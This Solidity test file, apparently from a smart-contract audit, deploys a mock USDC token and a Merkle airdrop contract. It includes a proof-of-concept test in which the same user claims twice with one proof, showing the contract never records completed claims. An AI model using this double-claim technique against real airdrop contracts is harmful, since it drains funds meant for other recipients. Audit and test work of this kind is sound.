// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {MerkleAirdrop} from "../src/MerkleAirdrop.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

// Minimal mock ERC20 to stand in for USDC
contract MockUSDC is ERC20 {
    constructor() ERC20("Mock USDC", "mUSDC") {
        _mint(msg.sender, 1_000_000e18);
    }
}

contract MerkleAirdropTest is Test {
    MerkleAirdrop airdrop;
    MockUSDC token;

    // From tree.json
    bytes32 constant ROOT =
        0xf69aaa25bd4dd10deb2ccd8235266f7cc815f6e9d539e9f4d47cae16e0c36a05;
    address constant USER = 0x20F41376c713072937eb02Be70ee1eD0D639966C;
    uint256 constant AMOUNT = 25e18;

    // Proof derived from tree.json for USER at index 6
    bytes32[] proof;

    function setUp() public {
        // Set up the Merkle proof for the user
        proof = new bytes32[](2);
        proof[
            0
        ] = 0x4fd31fee0e75780cd67704fbc43caee70fddcaa43631e2e1bc9fb233fada2394;
        proof[
            1
        ] = 0xc88d18957ad6849229355580c1bde5de3ae3b78024db2e6c2a9ad674f7b59f84;

        // Deploy mock USDC token and MerkleAirdrop contract
        token = new MockUSDC();
        airdrop = new MerkleAirdrop(ROOT, IERC20(address(token)));

        // Fund the airdrop contract with enough tokens for multiple claims
        token.transfer(address(airdrop), 200e18);
    }

    function test_H1_UserCanClaimTwice() public {
        // Give user some eth to pay the fee
        vm.deal(USER, 10 ether);

        uint256 balanceBefore = token.balanceOf(USER);

        // First claim - should succeed
        vm.prank(USER);
        airdrop.claim{value: 1e9}(USER, AMOUNT, proof);
        assertEq(
            token.balanceOf(USER),
            balanceBefore + AMOUNT,
            "first claim failed"
        );

        // second claim - should also succeed to prove the vulnerability(lack of state tracking)
        vm.prank(USER);
        airdrop.claim{value: 1e9}(USER, AMOUNT, proof);
        assertEq(
            token.balanceOf(USER),
            balanceBefore + 2 * AMOUNT,
            "second claim failed"
        );
    }
}
